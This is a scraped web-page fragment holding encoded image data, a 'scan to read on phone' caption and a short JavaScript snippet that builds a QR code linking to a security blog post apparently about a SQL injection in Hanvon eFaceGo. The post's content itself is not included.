qG8e4r/i1nW0ToT0g6B5CIczmuloz1/VYd6j18thzkG4/hU8DeRK0Z35dzcwBgKZJszYt/Yt69hznUP67nT7wTpnnbkVmhHNQHrCjPo9L4fkd7muW9d1eUdIf/jAMRCb3fi1NzAG4vQ8jlxUh49pAsqPb7iA8c2YRq9XF/WBRw9597uuD6mD894Qz6xoL5h9mLk5664ipI/1EG49zNxc4RiI4Ru/9gbGj993x4D1NM3D7EM4zFjTPy7rRT1InTqEwxqtK7SmnmvJO0J6qcOaw6xXz1rWiaUdl3pHSD+z+hAduH+4+PbNvi7/keVUIdP096HesfuQOgjqi7DW7Wuuc/VCmHv0bOdVc1yvfLMw7/NK17+Clwdypdmd+fMbGD/LgvXUfWsgvlzsR4A5BzM3D9EhqL5D94PkOwdOpcDj39w0INxaUV/c6ZB6cxAOwV4Ha91680e8PyHezjfB8W9ZTunVuSBTv5rrfeWifTqH9T49Z/0z/J2aYz94fpbeXy5C6uX2hujywvsTUrfwjdZ2IHCeXp27T7m0X1mw7msP+4uQPATNQbi5I8LsQbi1V/HYs56tq+dachGyD8xY2Vo9V1ot9cLtQMq81+ffwGkgNbFaHgUy7c5hrVftcVkn6sFcrw9rXb8jJA8Myz2G8PNBHXj82xcE1X/Ghtd5z+38qznrj3gayNG8nz//Bsb3IX3rPmV5R+vUIW+dOqy5+Z5Th7mu5+TiCmHuATN3L2shfte7D8lBsOchunUdYfYhHLh/lvX2zb7GH1nwMSXgdExg/NkKDB946EP4+QDR+9vz0x7QfZjrui8XR6P3B0jt++PjlxnxIb7/o/N3afoF6QNBTetEdUgOgurmILpcH6LLC8dAitzr629gOxCYp+d0RZh9fyv6cphzO19d7PWvdP1Ca0XIGcqrBeEwo/mOVVML1vnyVguS3/XrevHtQMq81+ffwGkgq0mXBpk2BEur1Y8M8dUrUwtmvftySA6C6iJEr561IBwwMhB4/P1WuVrDaA/lHVezBzWj0Dlkv+6bg/gQXOVOAzF049fcwGkgkOlB0GM5ZbHrOw5zH3MQHYLqr3C3f+m7WsgeEKxsLfMQHYLl1dLvWF6tqzqkr/mqrSU/4mkgR/N+/vwbGP89pG9dE6zVdci0YY3mq7aW/CpWzWrBej/Y672PZ4DUyHf448ePx//OTB9SB8GdDvEhaK6j54PkgPs79bdv9jV+luW0xN059cWeg0y76+Yhvrzndrzn5Su0B2Qv+SpbWvchdTDjLtf16nlc+iKkr/yI998hx9v4Bs/j7xDI1OAa9rP7RnRdDukrF62D+BDUf4WQPLCNAo/vR2CNvdAzqXf+SofsY66j/eCcuz8h/ba+mI+BOLVX2M9rvuuQ6et37PnuQ+phxmd13ZP33uodYb0XRO/5HXe/nf9MHwN5Frq9z7uB00AgbwPMePVI/e2AuQ/M3L4QXW6fjvqQPJzRjLVySFau/6sIcx/7QXSYUf8KngZypejO/Lsb+OOBQN4GjwgzV+/oW9l1OaQPzKgv2ueIeh2PmXruPmQvdVjzqq0F8eu5lnX1fFxd3/HS/3gg1eRef+8G/vpAjm9GPfejllYL8nZBsLRaMPPSnq3e/8ghvWBGMzDr7gPRd9x6EZKXi7DW9UX3KfzrA3GTG3/vBk4DqSmt1q69WX1YvxU9Z16EdR2sdeueoXuKz7LlwbW9IDn7itXjuNRFPUi9/IingRzN+/nzb2AMBDI1eI5XjwjpYx7CIehbI5rbcUiduWfYe8BcCzPveXvDnIOZ91zvA3Me1hyiA/d/D3n7Zl/jE/LNzvV/e5z/AQAA//8Ui9RMAAAABklEQVQDADrqa8J+4jctAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-getValidEmpForGroup-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 